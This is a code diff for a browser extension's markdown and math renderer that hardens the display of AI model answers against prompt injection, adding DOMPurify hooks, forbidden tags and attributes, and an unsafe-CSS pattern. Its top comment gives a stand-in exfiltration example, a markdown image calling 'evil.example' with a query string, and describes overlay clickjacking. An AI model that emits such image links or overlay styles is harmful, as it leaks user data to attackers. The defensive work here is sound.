@@ -12,12 +12,17 @@ marked.setOptions({ gfm: true, breaks: false });
 
 /**
  * Answers now come from a real model, and a page can try to steer a model
- * (prompt injection). Two consequences for what we render:
+ * (prompt injection). Three consequences for what we render:
  * - Links open in a new tab. Followed in place, a link would navigate the
  *   side panel itself away from the extension.
- * - No remote media. `![](https://evil.example/?q=…)` would otherwise make
- *   the panel fetch a URL of the model's choosing, carrying whatever it was
- *   talked into putting there. Answers are text and KaTeX; nothing needs <img>.
+ * - Nothing is fetched. `![](https://evil.example/?q=…)`, a CSS
+ *   `url(…)`, a `background` attribute or an SVG/MathML image would make the
+ *   panel fetch a URL of the model's choosing with no click, carrying
+ *   whatever it was talked into putting there. Answers are text and KaTeX;
+ *   nothing needs a remote resource. (The pages' CSP refuses remote images
+ *   too: wxt.config.ts.)
+ * - An answer stays in its box: no fixed or absolute layers drawn over the
+ *   rest of the panel, where a click would land on the model's link.
  */
 DOMPurify.addHook('afterSanitizeAttributes', (node) => {
   if (node.tagName === 'A') {
@@ -25,13 +30,21 @@ DOMPurify.addHook('afterSanitizeAttributes', (node) => {
     node.setAttribute('rel', 'noopener noreferrer');
   }
 });
-const FORBID_TAGS = ['img', 'picture', 'source', 'video', 'audio', 'track', 'image', 'link', 'style', 'form', 'input', 'button'];
+/** A style that fetches something or leaves the answer's box. KaTeX's own styles never do either. */
+const UNSAFE_STYLE = /url\s*\(|image-set|image\s*\(|expression\s*\(|@import|behavior\s*:|binding\s*:|position\s*:\s*(fixed|absolute|sticky)/i;
+DOMPurify.addHook('uponSanitizeAttribute', (_node, data) => {
+  if (data.attrName === 'style' && UNSAFE_STYLE.test(data.attrValue)) data.keepAttr = false;
+});
+const FORBID_TAGS = ['img', 'picture', 'source', 'video', 'audio', 'track', 'image', 'feimage', 'mglyph', 'link', 'style', 'form', 'input', 'button'];
+/** Attributes that fetch (background, ping) on tags otherwise allowed. */
+const FORBID_ATTR = ['background', 'ping', 'poster', 'srcset', 'action', 'formaction'];
 
 const PLACEHOLDER = (i: number) => `\u0000MATH${i}\u0000`;
 
 export function renderMath(tex: string, display: boolean): string {
   try {
-    return katex.renderToString(tex, { displayMode: display, throwOnError: false, output: 'htmlAndMathml', strict: 'ignore' });
+    // maxSize: a formula can't stretch an answer (\\rule, \\kern) to any size.
+    return katex.renderToString(tex, { displayMode: display, throwOnError: false, output: 'htmlAndMathml', strict: 'ignore', maxSize: 50 });
   } catch {
     return `<code>${escapeHtml(tex)}</code>`;
   }
@@ -50,7 +63,7 @@ export function renderMarkdownFragment(src: string): DocumentFragment {
   return DOMPurify.sanitize(markdownHtml(src), { ...SANITIZE, RETURN_DOM_FRAGMENT: true });
 }
 
-const SANITIZE = { USE_PROFILES: { html: true, mathMl: true, svg: true }, FORBID_TAGS };
+const SANITIZE = { USE_PROFILES: { html: true, mathMl: true, svg: true }, FORBID_TAGS, FORBID_ATTR };
 
 function markdownHtml(src: string): string {
   const math: string[] = [];
